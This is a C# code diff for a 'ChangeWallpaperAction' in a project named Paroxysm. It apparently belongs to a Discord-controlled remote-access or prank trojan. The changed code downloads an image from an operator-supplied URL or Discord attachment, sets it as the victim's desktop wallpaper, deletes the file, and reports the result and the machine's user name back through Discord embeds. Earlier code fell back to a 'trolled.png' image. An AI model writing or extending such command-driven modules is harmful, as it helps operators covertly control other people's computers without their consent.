@@ -1,4 +1,5 @@
 ﻿using System.Net;
+using System.Net.Mail;
 using Discord;
 using Paroxysm.Discord;
 
@@ -6,27 +7,55 @@ namespace Paroxysm.Hooks.Actions;
 
 public static class ChangeWallpaperAction
 {
+    private static readonly string localImagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "temp_wallpaper.jpg");
     private static async Task<bool> SetWallpaperFromUrl(string imageUrl)
     {
         try
         {
             using WebClient client = new();
-            var localImagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
-                "temp_wallpaper.jpg");
             await client.DownloadFileTaskAsync(new Uri(imageUrl), localImagePath);
 
             if (SetWallpaper(localImagePath))
             {
-                Thread.Sleep(10000);
-                File.Delete(localImagePath);
+                DeleteFileAfterTime();
                 return true;
             }
 
-            Thread.Sleep(10000);
-            File.Delete(localImagePath);
+            DeleteFileAfterTime();
             return false;
         }
         catch
+        {
+            return false;
+        }
+    }
+
+    private static void DeleteFileAfterTime()
+    {
+        Thread.Sleep(10000);
+        File.Delete(localImagePath);
+    }
+
+    private static async Task<bool> SetWallpaperFromAttachment(IAttachment imageAttachment)
+    {
+        try
+        {
+            using (var httpClient = new System.Net.Http.HttpClient())
+            {
+                var imageData = await httpClient.GetByteArrayAsync(imageAttachment.Url);
+
+                File.WriteAllBytes(localImagePath, imageData);
+
+                if (SetWallpaper(localImagePath))
+                {
+                    DeleteFileAfterTime(); 
+                    return true;
+                }
+
+                DeleteFileAfterTime();
+                return false;
+            }
+        } catch
         {
             return false;
         }
@@ -40,23 +69,24 @@ public static class ChangeWallpaperAction
     }
 
 
-    public static async Task<Embed> Follow(string? imageUrl)
+    public static async Task<Embed> Follow(object? image)
     {
-        if (await SetWallpaperFromUrl(imageUrl!))
+        if (image is string)
         {
-            return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed.",
-                "Image has been set as desktop wallpaper.", Environment.UserName, null);
-        }
-
-        const string localImagePath = "trolled.png";
-        if (!File.Exists(localImagePath))
+            if (await SetWallpaperFromUrl(image as string))
+            {
+                return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed.",
+                    "Image has been set as desktop wallpaper.", Environment.UserName, null);
+            }
+        } else if (image is IAttachment)
         {
-            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
-                "Unable to set desktop wallpaper.", Environment.UserName, null);
+            if(await SetWallpaperFromAttachment(image as IAttachment)) {
+                return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed.", "Image has been set as desktop wallpaper.", Environment.UserName, null);
+            }
+        } else
+        {
+            return DiscordEmbed.CreateWithText(Color.Red, "Command cannot be executed", "image data doesnt have right value", Environment.UserName, null);
         }
-
-        SetWallpaper(localImagePath);
-        return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed.",
-            "Local image was been set as desktop wallpaper.", Environment.UserName, null);
+        return DiscordEmbed.CreateWithText(Color.Red, "There was an unexpected behavior", "While executing command something went wrong", Environment.UserName, null);
     }
 }
